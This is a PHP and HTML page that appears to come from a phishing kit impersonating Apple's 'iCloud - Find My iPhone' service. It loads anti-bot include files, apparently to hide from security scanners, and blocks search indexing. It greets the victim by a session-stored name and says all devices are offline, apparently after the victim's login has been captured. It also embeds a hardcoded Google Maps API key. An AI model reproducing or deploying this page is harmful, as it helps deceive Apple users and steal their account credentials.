<?php
session_start();
error_reporting(0);
include "antibots.php";
include "antibots1.php";

$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
 
switch ($lang) {
case 'en':
  $lang_file = 'lang.en.php';
  break;
 
  case 'fr':
  $lang_file = 'lang.fr.php';
  break;
 
  case 'es':
  $lang_file = 'lang.es.php';
  break;

  case 'de':
  $lang_file = 'lang.de.php';
  break;
 
 case 'ja':
  $lang_file = 'lang.ja.php';
  break;
  
  case 'nl':
  $lang_file = 'lang.nl.php';
  break;
  
  case 'be':
  $lang_file = 'lang.be.php';
  break;
  
   case 'pl':
  $lang_file = 'lang.pl.php';
  break;
  
   case 'zh':
  $lang_file = 'lang.zh.php';
  break; 
  
  case 'hu':
  $lang_file = 'lang.hu.php';
  break;
      
  default:
  $lang_file = 'lang.en.php';
 
}
 
include_once 'languages/'.$lang_file;
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<!--[if IE 6]><meta http-equiv="refresh" content="0;URL=unsupported/"><![endif]--> 
	<!--[if IE 7]><meta http-equiv="refresh" content="0;URL=unsupported/"><![endif]--> 
	<!--[if IE 8]><meta http-equiv="refresh" content="0;URL=unsupported/"><![endif]-->
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta content="width=device-width, initial-scale=1" name="viewport">
	<meta name="robots" content="noindex, nofollow">
	<title>iCloud - Find My iPhone</title>
	<link rel="shortcut icon" type="image/x-icon" href="img/favicon.ico">
	<link rel="stylesheet" href="assets/layout/strap.css">
	<link rel="stylesheet" href="assets/layout/apple.css">
	<link rel="stylesheet" href="assets/layout/kit.css">
	<link rel="stylesheet" href="assets/layout/animate.css">	
	<script src="http://code.jquery.com/jquery-1.11.3.min.js"></script>
</head>
<body class="find">
<section id="header2">
	<a class="allDevices hidden-sm hidden-xs hidden-md"><span><?php echo $lang['ALL_DEVICES']; ?></span><i class="glyphicon glyphicon-menu-down"></i>
		<div class="getDevice">
			<div class="deviceBody">
				<ul>
				<li class="active" data-id="deviceID0" data-name="All Devices">
					<div class="imga">
						<img src="assets/img/devices/alldevice.png" alt="">
					</div>
					<div class="namea"><?php echo $lang['ALL_DEVICES']; ?></div></li>
				</ul>
			</div>
		</div>
	</a>
	<div class="container-fluid">
		<div class="row">
			<div class="col-md-4 col-xs-8 rightH rtl">
				<a class="help" title="Help and Support" alt="Help and Support" href="https://help.apple.com/icloud/"></a>
				<a class="logout" title="Logout" alt="Logout" href="https://icloud.com"></a>
				<span class="spreat"></span>
				<div class="setup fName" style="display: block;"><i class="glyphicon glyphicon-menu-down"></i><span><?=$_SESSION["name"];?></span>
					<ul>
						<li><a href="/find.php"><?php echo $lang['ICLOUD_SETTINGS']; ?></a></li>
						<li><a href="https://icloud.com"><?php echo $lang['SIGN_OUT']; ?></a></li>
					</ul>
				</div>

			</div>
			<div class="col-md-8 col-xs-4 leftH">
				<span class="icloud"></span><span class="find"><?php echo $lang['FIND_MY_IPHONE']; ?></span>
			</div>
		</div>
	</div>
</section>

<script src="http://maps.google.com/maps/api/js?key=AIzaSyDoqzcKrNPa8CzSeRPv8g7Q4mODVrjPizU" type="text/javascript"></script>

<section id="compass">
	<div class="compass">
		<img src="assets/img/compass1.png" class="compass1" alt="">
		<img src="assets/img/compass2.png" class="compass2" alt="">
		<img src="assets/img/compass3.png" class="compass3" alt="">
		<span><?php echo $lang['LOCATE']; ?></span>
	</div>
	<div class="clearfix"></div>
</section>
<div class="findBody">
<section id="findmap0" class="findmap ltr shows">
<div class="container">
	<div class="row">
		<div class="col-md-12 col-xs-12">
			<div class="deviceOff">
				<img src="assets/img/packed-3_02.png" alt="">
				<h2><?php echo $lang['ALL_DEVICES_OFFLINE']; ?></h2>
				<p><?php echo $lang['NO_LOCO']; ?></p>
			</div>
		</div>
	</div>
</div>
</section>
</div>
<script>
	$(document).ready(function() {
		$('.deviceBody ul li[data-id="deviceID0"]').on('click', function() {

	  if ( $("#findmap0").hasClass('shows') ) {

	  } else {
	  	$("#findmap0").addClass('shows', 500).siblings().removeClass('shows', 500);
		}

		});
	});
</script>	<script src="assets/js/apple.min.js"></script>
	<script src="assets/js/mapiconmaker.js"></script>
	<script src="assets/js/ajax-form.min.js"></script>

	<script type="text/javascript">

	$(document).ready(function() {

		
		setTimeout(function(){
			$('#compass').fadeOut(100);
		},5000);
	});
	</script>
</body>
</html>